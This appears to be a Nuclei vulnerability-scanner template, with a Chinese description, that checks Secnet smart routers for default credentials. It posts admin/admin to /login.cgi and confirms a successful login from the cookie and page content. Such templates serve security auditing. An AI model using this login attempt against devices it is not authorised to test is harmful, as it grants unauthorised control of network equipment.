id: Secnet-Weakpassword

info:
  name: Secnet-智能路由系统弱口令漏洞
  author: Unknown
  severity: medium
  description: Secnet-智能路由系统被发现存在默认或弱口令配置问题，允许未经授权的攻击者通过暴力破解或利用常见凭证组合访问系统管理界面，进而获取系统控制权限。
  tags: Secnet

http:
- raw:
  - |
    POST /login.cgi HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
    Content-Type: application/x-www-form-urlencoded

    user=admin&password=admin
  matchers-condition: and
  matchers:
  - type: word
    part: header
    words:
    - "Set-Cookie: ac_userid=admin"
  - type: word
    part: body
    words:
    - 'window.open('
    - 'index.htm?_'
    condition: and
  - type: status
    status:
    - 200
